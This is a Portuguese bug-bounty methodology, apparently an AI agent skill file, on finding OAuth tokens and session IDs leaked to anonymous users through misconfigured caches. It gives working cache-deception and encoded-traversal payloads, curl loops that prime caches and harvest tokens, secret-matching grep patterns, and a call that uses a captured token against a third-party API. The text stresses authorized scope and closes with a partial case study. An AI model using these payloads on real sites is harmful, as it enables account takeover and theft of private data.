---
name: web-cache-auth-leak
description: Metodologia para encontrar vazamento de segredos de usuário autenticado (OAuth access_token / refresh_token, chaves de API, PII) servidos a atacantes NÃO autenticados por causa de cache server-side/CDN que não varia por estado de autenticação. Use SEMPRE que o alvo tiver páginas de perfil público, vínculo de contas de redes sociais (YouTube, Twitch, Instagram, TikTok, Spotify, Discord), integrações OAuth, ou qualquer página autenticada que possa estar cacheada; e sempre que o usuário mencionar "token no HTML", "cache poisoning", "web cache deception", "access_token vazando", "página cacheada com dado de outro usuário", "resposta inconsistente", "às vezes aparece às vezes não". São DOIS bugs que compõem: (A) segredo renderizado no HTML/hydration payload quando deveria ficar só no server-side, e (B) cache sem Vary por cookie/sessão, fazendo a versão autenticada ser servida a anônimos. Cobre: onde procurar segredos no HTML (__NEXT_DATA__, __INITIAL_STATE__, JSON embutido), fingerprint da camada de cache pelos headers (Age, X-Cache, CF-Cache-Status, X-Varnish, Vary), a REGRA DE ORDEM DE PRIMING (se a página for acessada anonimamente primeiro, a versão SEM o token fica cacheada e bloqueia o teste até o TTL expirar), por que o comportamento é não-determinístico (nós/shards de cache distintos, cada um com sua cópia), protocolo de polling e de confirmação a partir de outro IP/POP, e como escrever um report reproduzível de bug não-determinístico. CACHE BUSTER ALEATÓRIO OBRIGATÓRIO EM TODA REQUISIÇÃO, com e sem extensão (?cb=$RANDOM$RANDOM) — nunca testar direto na URL de produção, porque a entrada de cache real pode já estar preenchida por outra pessoa ou por rodada anterior (falso positivo) e porque qualquer coisa cacheada sem buster é servida a usuários reais (dano); mesmo buster dentro de um ciclo, buster NOVO ao trocar de técnica, extensão, estado (anônimo/autenticado), página ou ao repetir rodada; nada de cb fixo tipo ?cb=1. COBRE TAMBÉM CACHE DECEPTION — forçar cacheabilidade de endpoint sensível que responde CF-Cache-Status: DYNAMIC, com as quatro técnicas de path confusion: (a) extensão como novo segmento (/account/test.css), (b) ponto e vírgula tratado como parâmetro pela origem mas lido como .css pelo cache (/user/get;test.css), (c) travessia codificada sob prefixo já cacheado para furar regra de exceção tipo "cacheia tudo menos /_api/*" (/endpoint-cacheado%2F../_api/user-info), e (d) extensão no lugar do valor de um parâmetro de path (/minNightlyPrice/x.jpeg); extensões: APENAS .js, .css e .jpg — nada além disso, para economizar requisições (4 técnicas x 3 extensões = 12 variantes por endpoint); e a máquina de estados DYNAMIC -> MISS (a técnica funcionou) -> HIT (reenviar a mesma URL confirma que veio do cache). TÉCNICA DE MAIOR ALCANCE, usar quando as quatro falharem: WILDCARD CACHE RULE + TRAVESSIA CODIFICADA — achar um prefixo que cacheia QUALQUER coisa debaixo dele (detectado pedindo um caminho INEXISTENTE sob o prefixo e recebendo HIT, ex.: /share/*, /public/*, /static/*, /embed/*) e então atravessar por dentro dele até o endpoint sensível com /share/%2F..%2Fapi/auth/session?cachebuster=123 — o CDN não decodifica nem normaliza %2F..%2F e cacheia como se estivesse sob /share/, enquanto o servidor de origem decodifica, normaliza e responde /api/auth/session com o token; isso cacheia QUALQUER arquivo ou endpoint do servidor, inclusive os com Cache-Control: private, e não depende do endpoint sensível cooperar; mirar endpoints de API JSON (/api/auth/session, /api/me, /api/user, /oauth/token), usar sempre curl --path-as-is, e ir aumentando o número de travessias até acertar a profundidade (caso ChatGPT/OpenAI, US$ 6.500). ATENÇÃO: a AUSÊNCIA de headers de cache (CF-Cache-Status, X-Cache, Age, Cache-Control, Vary) NÃO prova que o alvo não cacheia — proxies internos e CDNs com headers removidos armazenam sem anunciar; os headers são atalho de diagnóstico, e a prova é sempre COMPORTAMENTAL (primar autenticado, requisitar sem cookie, ver se o dado volta). REGRA DE OURO: ler SEMPRE o corpo da resposta em QUALQUER status code — um 404 "Página não encontrada" frequentemente ainda carrega window.current_user, token de sessão em texto claro (HASESSIONV3, JSESSIONID), user_id, e-mail e telefone, porque o framework hidrata o layout antes de decidir que a rota não existe; e respostas 200 OK têm TTL de cache muito maior, então vale preservar o 200. Sessão em texto claro no corpo = account takeover direto, sem precisar de XSS. Esta é uma classe propensa a FALSO NEGATIVO — o erro típico é descartar como falso positivo. Só usar dentro do escopo formalmente autorizado.
---

# Vazamento de Segredo Autenticado via Cache

Metodologia para achar segredos de um usuário autenticado sendo entregues a
atacantes **não autenticados**, porque uma camada de cache guardou a resposta
autenticada e a serve para todo mundo.

**REGRA DE OURO — cache buster aleatório em TODA requisição.** Sempre
`?cb=<aleatório>`, **com ou sem extensão**, em todo passo do fluxo. Ver seção
1.2 para o porquê — não é formalidade, é o que separa achado válido de falso
positivo.

**Pré-condição obrigatória**: só use dentro do escopo formalmente autorizado.
Nos testes, use **duas contas que você mesmo controla** (uma como "vítima",
outra como "atacante") — nunca alveje a conta de um usuário real. Se um token
de terceiro aparecer acidentalmente, pare, não o utilize, e reporte.

## 1. A composição — dois bugs que isolados são fracos

```
   BUG A                                BUG B
   Segredo renderizado no HTML          Cache não varia por autenticação
   (access_token no markup)             (falta Vary: Cookie)
   Sozinho: Low/Informational           Sozinho: Low/Informational
              \                          /
               \                        /
                v                      v
        Segredo de usuário autenticado servido
        a QUALQUER pessoa, sem autenticação
                  = High / Critical
```

Por isso a caça precisa das duas metades. Achar só o token no HTML rende um
"informativo, o usuário já tem acesso ao próprio token". Achar só o cache
frouxo rende "não há dado sensível". **A junção é o achado.**

### 1.1 Distinguir das classes vizinhas

| Classe | Mecanismo | Como testar |
|---|---|---|
| **Este bug** (cached auth response) | Cache guarda a resposta autenticada e serve a anônimos | Vítima visita autenticada; atacante requisita anônimo |
| **Web Cache Deception** | Atacante faz a vítima abrir `/profile/x.css`; o cache guarda por extensão | Anexar `.css`, `.js`, `/x.css`, `%0Ax.css` ao path |
| **Web Cache Poisoning** | Atacante injeta via header não-chaveado (`X-Forwarded-Host`) e envenena a entrada | Header malicioso + verificar persistência |

Testa as três no mesmo endpoint — o mesmo cache mal configurado costuma
permitir mais de uma.

### 1.2 Cache buster — sempre, aleatório, com ou sem extensão

Todo request do fluxo leva `?cb=<aleatório>`:

```bash
CB="?cb=$RANDOM$RANDOM"
URL="https://alvo.com/profile/ID$CB"              # sem extensao
UX="https://alvo.com/profile/ID.js$CB"            # com extensao
```

**Três razões, e as duas primeiras são o que mais importa:**

1. **A página real pode já estar envenenada / suja.** Se você testar direto na
   URL de produção, pode estar lendo uma entrada de cache preenchida por outra
   pessoa, por uma rodada anterior sua, ou por um usuário qualquer. Você
   concluiria "vazou!" sobre um estado que não foi você que criou — falso
   positivo. Com buster novo, a chave é sua e o que aparecer nela foi você quem
   pôs.
2. **Testar direto na página real pode dar erro e causar dano.** Sem buster,
   qualquer coisa que você cacheie é servida a usuários reais. Buster isola.
3. **A ordem de priming exige entrada virgem** (seção 6). Um buster novo
   *cria* uma entrada virgem na hora, em vez de você ter que esperar o TTL de
   uma chave já suja.

**Quando trocar o buster:**

```
mesmo cb   ->  dentro de um mesmo ciclo (primar autenticado + validar anônimo)
cb NOVO    ->  ao trocar de técnica de deception
cb NOVO    ->  ao trocar de extensão
cb NOVO    ->  ao trocar de estado (anônimo <-> autenticado)
cb NOVO    ->  ao trocar de página
cb NOVO    ->  ao repetir uma rodada já feita
```

Reutilizar buster é o mesmo problema do item 1: chave já suja, resultado não
confiável.

**Aleatório de verdade.** Nada de `?cb=1` ou `?cb=123` fixo — outra pessoa
testando o mesmo alvo usa exatamente esses, e você herda o cache dela. Use
`$RANDOM$RANDOM` ou equivalente.

## 2. Onde o segredo se esconde no HTML

Nem sempre está num atributo visível. Os lugares que mais rendem são os
**payloads de hidratação** de frameworks SPA:

```
__NEXT_DATA__              (Next.js)
window.__INITIAL_STATE__   (Vue/Redux)
window.__NUXT__            (Nuxt)
window.__APOLLO_STATE__    (Apollo GraphQL)
<script type="application/json">
data-* em elementos raiz    (data-props, data-page, data-state)
```

Esses blobs costumam ser o objeto de usuário **inteiro** vindo do backend,
serializado sem filtro — inclusive campos que a interface nunca exibe.

**Grep no HTML salvo:**

```bash
grep -oiE '(access|refresh|id)_?token["'\'':= ]+[A-Za-z0-9._~+/-]{20,}' pagina.html
grep -oiE '(api[_-]?key|secret|bearer|authorization|client[_-]?secret)' pagina.html
grep -oiE 'ya29\.[A-Za-z0-9_-]+'      # Google/YouTube OAuth
grep -oiE 'gh[pousr]_[A-Za-z0-9]{36}' # GitHub
grep -oiE 'xox[baprs]-[A-Za-z0-9-]+'  # Slack
grep -oiE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.'  # JWT
```

E extraia o blob de hidratação para inspeção estruturada:

```bash
python3 - <<'PY'
import re, json
h = open('pagina.html', encoding='utf-8', errors='replace').read()
for m in re.finditer(r'__NEXT_DATA__[^>]*>(.*?)</script>', h, re.S):
    d = json.loads(m.group(1))
    print(json.dumps(d, indent=2)[:4000])
PY
```

**Alvos de alto valor:** páginas de perfil com **contas de redes sociais
vinculadas**. O token OAuth do YouTube/Twitch/Instagram/TikTok frequentemente é
serializado junto do objeto da conta vinculada.

## 3. Fingerprint da camada de cache

Antes de testar, entenda o que está cacheando. Olhe os headers de resposta:

```bash
curl -sI "https://alvo.com/profile/ID" | grep -iE \
 'age|cache|x-cache|cf-cache|x-varnish|x-served-by|x-timer|via|vary|etag|last-modified|expires|surrogate'
```

| Header | O que diz |
|---|---|
| `Age: N` | **Sinal mais forte.** A resposta está no cache há N segundos. |
| `X-Cache: HIT/MISS` | Varnish, Fastly, CloudFront |
| `CF-Cache-Status: HIT/MISS/DYNAMIC` | Cloudflare |
| `X-Varnish: <id> <id>` | Dois IDs = HIT |
| `X-Served-By`, `X-Cache-Hits` | Fastly; o nome do POP importa (seção 7) |
| `Cache-Control: public, max-age=N` | **Grave se a página for autenticada** |
| **`Vary:`** | **A chave de tudo — ver abaixo** |

### 3.1 O `Vary` é o coração do bug

A chave de cache é tipicamente `método + host + URL + headers listados em Vary`.
**Cookies não entram na chave por padrão.**

- `Vary: Cookie` presente → autenticado e anônimo têm entradas separadas. Seguro.
- `Vary: Accept-Encoding` apenas, ou ausente → **autenticado e anônimo
  compartilham a mesma entrada**. É exatamente o bug.

Se você vê `Cache-Control: public` com `Age` crescente e **sem** `Vary: Cookie`
numa página que renderiza dado de usuário, você já tem a hipótese formada.

## 4. Forçar cacheabilidade — path confusion (Cache Deception)

Quando o endpoint que carrega o segredo **não é cacheável** (`CF-Cache-Status:
DYNAMIC`, `Cache-Control: private`), o bug não acabou: o passo seguinte é
**fazer o cache achar que aquilo é um arquivo estático**, enquanto o servidor
de origem continua entregando o conteúdo dinâmico.

```
   [ CACHE ]  olha a URL e pensa: "termina em .css, é estático, vou guardar"
   [ ORIGEM ] olha a URL e pensa: "isso é a rota /account, vou renderizar"
                       └── as duas discordam = deception
```

### 4.1 O sinal: a transição do `CF-Cache-Status`

O header conta a história inteira. Acompanhe a máquina de estados:

```
DYNAMIC  ->  cache decidiu NÃO guardar. É o baseline do endpoint sensível.
MISS     ->  cache PASSOU a considerar cacheável, mas ainda não tinha cópia.
             *** ESTE É O SINAL *** a técnica funcionou.
HIT      ->  a resposta veio DO CACHE. Reenvie a mesma URL para chegar aqui.
             É a confirmação final.
```

Fluxo de confirmação: `DYNAMIC` → aplica a técnica → `MISS` → **reenvia a mesma
URL** → `HIT` → abre em **outro navegador/rede** e o dado ainda está lá.

Equivalentes em outros CDNs: `X-Cache: MISS/HIT` (Fastly, CloudFront, Varnish),
`Age > 0`, `X-Varnish` com dois IDs.

#### ⚠ Ausência de header NÃO prova que não cacheia

**Muitos alvos armazenam em cache sem anunciar nada.** Proxies reversos
internos, CDNs configuradas para remover headers de debug, camadas de cache
caseiras — todas podem guardar a resposta sem emitir `CF-Cache-Status`,
`X-Cache`, `Age`, `Cache-Control` ou `Vary`.

Portanto:

- **Nunca descarte um endpoint só porque não há header de cache.**
- Os headers são um **atalho de diagnóstico**, não a prova. Quando existem,
  aceleram; quando faltam, você simplesmente segue sem eles.
- **A prova é sempre comportamental**: prima a entrada com a conta autenticada,
  requisite a mesma URL **sem cookie nenhum** e veja se o dado volta. Se voltar,
  está cacheado — independentemente do que os headers digam ou deixem de dizer.
- Sem headers, a confirmação exige mais rigor: repita mais vezes e teste de
  **outra rede** (seção 7), porque você não tem o `HIT` para se apoiar.

### 4.2 As quatro técnicas, nesta ordem

Aplique todas ao endpoint sensível — uma pode funcionar onde as outras falham.

**(a) Extensão anexada como novo segmento**

```
/gb/account/          ->  /gb/account/test.css
                          /gb/account/test.js
                          /gb/account/x.jpeg
```

**(b) Ponto e vírgula — path parameter confusion**

```
/-/x/us/us/open/user/get   ->  /-/x/us/us/open/user/get;test.css
```

Vários servidores tratam `;` como início de parâmetro de path, igual ao `?`:
a origem responde a rota `/get` e **ignora** o `;test.css`. O cache, porém,
lê a URL inteira e conclui "arquivo `.css` estático". É a técnica que
funciona quando **(a)** devolve 404 limpo.

**(c) Traversal codificado sob um prefixo já cacheado**

```
/qualquer-endpoint-cacheado%2F../_api/ucenter/user-info
```

A origem decodifica `%2F` em `/`, resolve o `..` e entrega o conteúdo de
`/_api/ucenter/user-info`. O cache **não decodifica**, então acha que o
recurso mora sob `/qualquer-endpoint-cacheado/` — um prefixo que ele já
sabe que é cacheável — e guarda.

Use como prefixo um endpoint que **já responde `HIT`** no alvo. Serve
justamente quando a aplicação isenta uma rota do cache (ex.: "cacheia tudo,
menos `/_api/*`") — a travessia contorna a regra de exceção.

**(d) Extensão no valor de um parâmetro de path**

```
/search/keywords:algo/minNightlyPrice/0    ->  /search/keywords:algo/minNightlyPrice/x.jpeg
```

Quando a rota aceita um valor variável no fim, coloque a extensão **no lugar
do valor**. A aplicação ignora ou trata como parâmetro inválido e ainda assim
renderiza a página com o segredo.

**Se as quatro falharem, vá para a 4.4** — a técnica de wildcard cache rule +
traversal, que não depende do endpoint sensível cooperar.

**Variações a somar antes disso:**

```
/endpoint%0Ax.css      /endpoint%3Fx.css      /endpoint%23x.css
/endpoint/x.css%3F     /endpoint//x.css       /endpoint/./x.css
```

### 4.3 Extensões a testar — apenas três

```
.js    .css    .jpg
```

**Só estas três, para economizar requisições.** São as que cobrem os casos
reais: `.css` e `.js` são as que mais rendem, e `.jpg` pega o cenário de cache
por extensão de imagem. Não vale gastar request com `.png`, `.svg`, `.woff`,
`.map`, `.ico` e afins — o ganho marginal não paga o volume.

Com 4 técnicas × 3 extensões, são 12 variantes por endpoint. Suficiente.

### 4.4 Wildcard cache rule + traversal codificado — a técnica mais forte

**Use quando as quatro técnicas da 4.2 falharem no endpoint sensível.** Em vez
de tentar fazer *aquele* endpoint cachear, você encontra **outro caminho que já
cacheia tudo** e atravessa por dentro dele até o endpoint sensível.

#### Passo 1 — Achar um prefixo com regra de cache wildcard

Procure um prefixo de path que cacheia **qualquer coisa** debaixo dele,
independente de extensão. O teste é de uma linha: peça um caminho **que não
existe** sob o prefixo e veja se vem `HIT`.

```bash
# prefixos candidatos: /share/, /public/, /static/, /assets/, /p/, /s/, /embed/
for P in share public static assets embed p s cdn media files; do
  CB="?cb=$RANDOM$RANDOM"
  ST=$(curl -sI "https://alvo.com/$P/caminho-que-nao-existe-xandsz$CB" \
        | grep -iE '^(cf-cache-status|x-cache|age):' | tr -d '\r' | tr '\n' ' ')
  echo "/$P/  -> $ST"
  sleep 1
done
```

Se um path **inexistente** volta cacheado, a regra não olha extensão — olha
**localização**. É algo como `/share/*`, e isso é o sinal verde.

> Regra relaxada de cache é perigosíssima justamente porque abre a porta para
> confusão de parser de URL.

#### Passo 2 — Atravessar por dentro do prefixo cacheado

O request passa por **duas** camadas que interpretam a URL — CDN e servidor de
origem. Se elas discordam sobre `%2F` e sobre normalização de `..`, você
escolhe qual conteúdo vai para qual chave de cache:

```
   CDN:     NÃO decodifica %2F, NÃO normaliza ".."
            vê "/share/%2F..%2Fapi/auth/session"  ->  "está sob /share/, vou cachear"

   ORIGEM:  DECODIFICA e NORMALIZA
            resolve para "/api/auth/session"      ->  responde o token
```

Resultado: a resposta do endpoint sensível fica salva **na chave do `/share/`**.

```
https://alvo.com/share/%2F..%2Fapi/auth/session?cachebuster=123
```

Variantes a testar (uma por vez, buster novo em cada):

```
/share/%2F..%2Fapi/auth/session
/share/..%2Fapi/auth/session
/share/%2f..%2f..%2fapi/auth/session
/share/%252F..%252Fapi/auth/session
/share/%2F..%2F..%2Fapi/auth/session
```

Vá aumentando o número de travessias até acertar a profundidade do prefixo.

#### Passo 3 — Endpoints sensíveis a mirar

Esta técnica cacheia **qualquer** resposta, inclusive JSON de API — não se
limite a HTML:

```
/api/auth/session      /api/me            /api/user
/api/account           /api/profile       /api/session
/api/v1/users/me       /_api/user-info    /oauth/token
/graphql               /api/settings
```

`/api/auth/session` é o alvo clássico: em apps Next.js/NextAuth ele devolve o
**token de autenticação** em JSON.

#### Passo 4 — Confirmar

Mesma ordem de priming da seção 6, com a URL da travessia:

```bash
CB="?cachebuster=$RANDOM$RANDOM"
U="https://alvo.com/share/%2F..%2Fapi/auth/session$CB"

# 1) VITIMA autenticada visita  -> resposta com token entra no cache
curl -s -H "Cookie: <sessao-da-vitima>" --path-as-is "$U" | head -c 300

# 2) ATACANTE, sem cookie nenhum, na MESMA URL
curl -s --path-as-is "$U" -D /tmp/h.txt | head -c 300
grep -iE '^(cf-cache-status|x-cache|age):' /tmp/h.txt
```

Se o token do passo 1 aparecer no passo 2, é game over: o atacante tem o token
da vítima e assume a conta.

**Use `--path-as-is`** — sem essa flag o curl normaliza o `..` no cliente e você
testa outra coisa.

#### Por que essa técnica é "wildcard"

As técnicas da 4.2 dependem de o **endpoint sensível** aceitar alguma
manipulação. Esta não: ela só depende de existir **um** prefixo cacheável em
qualquer lugar do site. Com ele, você cacheia **qualquer arquivo ou endpoint**
do servidor — inclusive os que têm `Cache-Control: private` e nunca cacheariam
sozinhos. Por isso é a última técnica da lista e a de maior alcance.

## 5. Regra de ouro: leia SEMPRE o corpo, em QUALQUER status code

**O erro que mais custa achado nesta classe é olhar o status e desistir.**

Um `404 Página não encontrada` **não significa que o segredo sumiu**. Muitos
frameworks montam o layout — com o objeto de usuário hidratado — *antes* de
decidir que a rota não existe. O resultado é uma página de erro que ainda
carrega `window.current_user` inteiro.

**Portanto, para toda resposta — 200, 301, 400, 403, 404, 500 — sempre:**

```bash
curl -s "$URL" -o r.html -D h.txt
grep -iE '^(cf-cache-status|x-cache|age|cache-control|vary):' h.txt
grep -oiE '(access|refresh|id|session)_?token["''':= ]+[A-Za-z0-9._~+/-]{20,}' r.html
grep -oiE 'current_user|__NEXT_DATA__|__INITIAL_STATE__|user_id|"email"' r.html
grep -oiE 'HASESSIONV3|JSESSIONID|PHPSESSID|[a-z_]*session[a-z_]*["''':= ]+[A-Za-z0-9._-]{16,}' r.html
```

O que caçar, além de token OAuth: **cookie/ID de sessão em texto claro**,
`user_id`, e-mail, telefone, CSRF/crumb token, chave de API, endereço.

Um detalhe que muda a severidade: **respostas `200 OK` costumam ter TTL de
cache muito maior** que 3xx/4xx. Se você conseguir a deception mantendo o
`200`, a janela de exposição é bem mais longa — vale tentar as variantes que
preservam o 200 antes das que caem em 404.

**Sessão em texto claro = takeover.** Se o corpo trouxer o valor do cookie de
sessão, o atacante não precisa de XSS: copia o token, usa direto no `Cookie:`
e entra na conta. Confira o que aquela sessão libera (ex.: um token CSRF numa
página de edição de perfil) para dimensionar o impacto no report.

## 6. A regra de ordem de priming — o erro que mata o teste

**Esta é a armadilha central desta classe.** A entrada de cache é preenchida
por **quem chegar primeiro**:

```
CENÁRIO A (funciona):
  vítima autenticada visita  ->  cache guarda versão COM token
  atacante anônimo requisita ->  recebe a versão COM token   [ACHADO]

CENÁRIO B (você bloqueou a si mesmo):
  atacante anônimo requisita ->  cache guarda versão SEM token
  vítima autenticada visita  ->  pode receber HIT da versão anônima
  atacante requisita de novo ->  versão SEM token, até o TTL expirar
                                 [FALSO NEGATIVO]
```

Ou seja: **se você acessou a página anonimamente antes da vítima acessá-la
autenticada, você mesmo cacheou a versão limpa** e o token não vai aparecer até
aquela entrada expirar.

Protocolo correto:

1. Escolha uma URL de perfil que você **ainda não tocou** anonimamente.
2. Se já tocou, **espere o TTL** (leia `Cache-Control: max-age` / observe o
   `Age` zerar) ou use um perfil/conta diferente.
3. **Primeiro** a vítima visita o próprio perfil autenticada.
4. **Só então** o atacante requisita anonimamente.

Se precisar de uma entrada nova sem esperar, um **cache buster aleatório**
(`?cb=$RANDOM$RANDOM`, seção 1.2) cria uma chave diferente — mas atenção: isso funciona nos dois sentidos. A
vítima precisa visitar **com o mesmo buster** para primar aquela entrada
específica. Bustar sozinho não ajuda, coordene.

## 7. Por que o resultado é não-determinístico

O comportamento típico é: o token aparece em **algumas** requisições anônimas,
não em todas. Isso não é ruído nem falso positivo — tem explicação:

**A camada de cache é distribuída.** CDN e proxies reversos rodam em muitos
nós/POPs/workers, e **cada um mantém sua própria cópia**. A visita da vítima
prima **um** nó. Suas requisições são distribuídas entre vários nós:

```
   requisição anônima ---> LB ---> nó A (tem versão COM token)     -> ACHADO
                              ---> nó B (tem versão SEM token)     -> nada
                              ---> nó C (MISS -> busca na origem)  -> nada
```

Por isso **repetir a requisição é parte do método, não teimosia**. No caso real
que originou esta skill, foram necessárias **9 ou 10 repetições** até o token
sair.

Consequências práticas:

- Uma única requisição negativa **não prova nada**. Nunca conclua com N=1.
- Testar **de outro IP / outra rede** aumenta a cobertura de POPs — é por isso
  que pedir a um amigo para testar funciona (e não só para "confirmar sanidade").
- Se os headers mostrarem o nó (`X-Served-By`, `X-Cache`), registre qual nó
  devolveu o token. Isso vira evidência forte no report.

## 8. Protocolo de teste

```bash
# 0) Duas contas suas: VITIMA e ATACANTE. Vincule uma rede social na VITIMA.

# CACHE BUSTER ALEATORIO - o MESMO nos passos 1..3 deste ciclo
CB="?cb=$RANDOM$RANDOM"
URL="https://alvo.com/profile/ID_VITIMA$CB"

# 1) Baseline anônimo na chave nova — só para ver headers, NÃO repetir muito
curl -sI "$URL" | grep -iE 'age|cache|vary'

# 2) VÍTIMA acessa o próprio perfil autenticada, NA MESMA URL COM O BUSTER.
#    Confirme que o token está no HTML da resposta AUTENTICADA:
curl -s -H "Cookie: <sessao-da-vitima>" "$URL" \
  | grep -oiE 'access_token["'\'':= ]+[A-Za-z0-9._~+/-]{20,}'

# 3) ATACANTE requisita anonimamente, EM LOOP, registrando cada resposta
for i in $(seq 1 30); do
  R=$(curl -s -D /tmp/h.$i "$URL")     # MESMO buster do passo 2
  AGE=$(grep -i '^age:' /tmp/h.$i | tr -d '\r')
  NODE=$(grep -iE '^(x-served-by|x-cache|cf-ray):' /tmp/h.$i | tr -d '\r' | tr '\n' ' ')
  if echo "$R" | grep -qi 'access_token'; then
    echo "[$i] TOKEN PRESENTE  $AGE  $NODE"
    echo "$R" > /tmp/hit_$i.html
  else
    echo "[$i] limpo           $AGE  $NODE"
  fi
  sleep 1
done
```

Note que o passo 2 é **obrigatório** e frequentemente pulado: você precisa
provar que o token está no HTML da versão autenticada, senão não sabe o que
está procurando na versão anônima.

### 8.1 Trilha de deception — quando o endpoint sensível não cacheia

Rode esta trilha sempre que achar um endpoint que devolve dado sensível mas
responde `DYNAMIC` / `private`:

```bash
BASE="https://alvo.com/gb/account"
COOKIE="<sessao da conta VITIMA que voce controla>"

for V in "/test.js" "/test.css" "/x.jpg" ";test.js" ";test.css" ";x.jpg"; do
  U="${BASE}${V}?cb=$RANDOM$RANDOM"        # buster NOVO por variante
  # 1) vitima autenticada prima a entrada
  curl -s -H "Cookie: $COOKIE" "$U" -o /dev/null -D /tmp/h1.txt
  # 2) atacante anonimo, mesma URL
  curl -s "$U" -o /tmp/r.html -D /tmp/h2.txt
  ST=$(grep -iE '^(cf-cache-status|x-cache|age):' /tmp/h2.txt | tr -d '\r')
  [ -z "$ST" ] && ST="(sem header de cache - vale mesmo assim)"
  if grep -qiE 'current_user|_token|session|"email"' /tmp/r.html; then
    echo "[VAZOU] $V  -> $ST"
  else
    echo "[ ---- ] $V  -> $ST"
  fi
  sleep 1
done
```

Depois, para toda variante que deu `MISS`: **reenvie a mesma URL** para chegar
em `HIT`, e abra em outro navegador/rede para confirmar. E se o prefixo do alvo
tiver rota isenta de cache (`/_api/*`), teste também a técnica (c) com um
endpoint que já responde `HIT` como prefixo.

## 9. Esta classe é propensa a FALSO NEGATIVO

Inversão importante em relação à maioria das metodologias: aqui o risco não é
confirmar um bug que não existe — é **descartar um bug que existe**.

Motivos para você errar descartando:

- O token não apareceu nas 3 primeiras tentativas → você conclui que não há bug.
  **Precisa de dezenas de tentativas.**
- Você bombardeou a URL anonimamente antes da vítima visitar → cacheou a versão
  limpa e se bloqueou (seção 4).
- Você testou de um único IP → bateu sempre no mesmo POP, que não tem a cópia
  com token.
- O TTL expirou entre a visita da vítima e o seu teste → janela fechada.
- A inconsistência parece "coisa de rede" → você racionaliza como falso positivo.

**Regras:** não conclua com menos de ~30 tentativas; teste de pelo menos duas
redes diferentes; refaça o ciclo completo (vítima visita → atacante requisita)
no mínimo duas vezes antes de descartar.

## 10. Impacto e escalada

Um `access_token` OAuth vale exatamente os **escopos** concedidos no vínculo.
Descubra quais são, com o mínimo de acesso possível:

```bash
# Google/YouTube — endpoint de introspecção, não acessa dado do usuário
curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=TOKEN"
# devolve scope, expires_in, audience
```

Com escopo de leitura confirmado, **uma** chamada basta como prova:

```bash
curl -H "Authorization: Bearer TOKEN" \
  "https://www.googleapis.com/youtube/v3/playlists?mine=true&part=snippet,status"
```

No caso real, o token do YouTube permitiu listar **playlists privadas**, listar
**vídeos privados do canal** e acessar informações do canal. O mesmo padrão vale
para Twitch, Instagram e TikTok.

**Regra de contenção:** faça a chamada mínima que prova o acesso, com a sua
própria conta-vítima. Não enumere, não pagine, não baixe conteúdo. Se o token
for de um usuário real, não use — descreva o que ele permitiria.

### 10.1 Amplificação — por que o impacto é maior do que parece

O que transforma isso de "janela estreita" em risco real:

- **Listas públicas de perfis.** Se a plataforma expõe diretórios de criadores
  registrados, o atacante tem uma lista de alvos pronta e pode **monitorar
  periodicamente** todos eles.
- **A janela reabre sozinha.** Toda vez que o criador visita o próprio perfil,
  o cache é renovado e uma nova janela se abre. Não é uma chance única — é um
  vazamento recorrente.
- **Engenharia social encurta a espera.** Convencer o usuário a vincular uma
  rede social (ou simplesmente a visitar o próprio perfil) e então bombardear
  requisições até o token sair.

Esses três pontos precisam estar no report — sem eles o triager lê "condição de
corrida improvável" e rebaixa a severidade.

## 11. Reportar um bug não-determinístico

O maior risco do report é o triager tentar uma vez, não reproduzir, e fechar.
Antecipe isso:

1. **Avise explicitamente que é inconsistente**, logo no começo, e diga quantas
   tentativas foram necessárias ("precisei repetir 9 ou 10 vezes").
2. **Dê a ordem exata do setup**, com a regra de priming explicada — o triager
   precisa saber que acessar anonimamente antes estraga o teste.
3. **Forneça o loop pronto** (seção 8), não um `curl` solto. Facilite ao máximo.
4. **Anexe a resposta bruta** com o token redigido e os headers de cache
   (`Age`, `X-Cache`, `X-Served-By`) que provam que veio do cache.
5. **Confirme de outro IP antes de reportar** — peça a alguém em outra rede.
   Isso descarta cache local/proxy do seu lado e você reporta com confiança.
6. **Explique a amplificação** (seção 10.1), senão a severidade cai.
7. **Sugira a correção**: `Cache-Control: private, no-store` em páginas
   autenticadas, `Vary: Cookie`, e — a correção de raiz — **parar de serializar
   o token no HTML**, mantendo-o server-side.

## 12. Casos reais

### 12.1 Token OAuth vazando por cache de página de perfil

A página de perfil da plataforma retornava, no HTML, o **access token e o
refresh token OAuth** das contas de redes sociais vinculadas ao perfil do
usuário autenticado. Isso já era errado por si só — o token deveria permanecer
apenas no server-side.

Quando o usuário acessava o próprio perfil, **a página era cacheada
server-side com o token embutido no HTML**. Se um atacante acessasse esse
perfil antes do cache expirar, o token era retornado na resposta **mesmo sem
autenticação**.

A janela de exposição estava ligada ao momento em que o usuário visitava o
próprio perfil. O cache inconsistente gerou muita confusão durante os testes,
já que o token não aparecia em todas as requisições não autenticadas, só (às
vezes) quando a versão cacheada com o token estava sendo servida. Além disso,
pelas observações do pesquisador, **se a página fosse acessada de forma não
autenticada anteriormente, a versão cacheada servida seria a versão SEM o
token** — ou seja, o token não retornaria em requisições não autenticadas até
que essa versão cacheada expirasse.

**Impacto observado:** com o access token, um atacante consegue acessar dados
privados das contas de redes sociais da vítima, dentro dos escopos concedidos
durante o vínculo. Com o token do YouTube foi possível listar playlists
privadas da vítima, listar vídeos privados do canal e acessar informações do
canal. O mesmo vale para Twitch, Instagram e TikTok.

Para criadores de conteúdo o impacto é especialmente relevante: a plataforma
tem listas públicas que expõem perfis de criadores registrados. Um atacante
pode monitorar periodicamente esses perfis e aguardar até que uma versão
cacheada com token ativo seja servida. Quando o criador visita o próprio
perfil, o cache é renovado e uma nova janela de exposição se abre. Também é
possível usar engenharia social para convencer o usuário a vincular uma rede
social e então bombardear requisições até o token ser retornado.

**Passos para reproduzir:**

Setup da vítima:
1. Vincular uma conta de rede social ao perfil na plataforma.
2. Acessar o próprio perfil estando autenticado. Isso faz com que a página seja
   cacheada com o token no HTML.

Passos do atacante:
1. Acessar o perfil da vítima em uma sessão não autenticada ou via curl:

```bash
curl -s "https://[REDACTED]/profile/:id" | grep "access_token"
```

2. Se o token não aparecer na primeira tentativa, repetir o comando. O cache
   com o token é servido de forma inconsistente. Na PoC enviada ao programa,
   foi necessário repetir a request **9 ou 10 vezes** até o token ser retornado.

3. Usar o token obtido para acessar dados privados da vítima na API da rede
   social vinculada:

```bash
curl -H "Authorization: Bearer :access_token" \
  "https://www.googleapis.com/youtube/v3/playlists?mine=true&part=snippet,status"
```

**Dicas e takeaways do caso:**

- Esse bug foi encontrado durante testes feitos **após uma correção
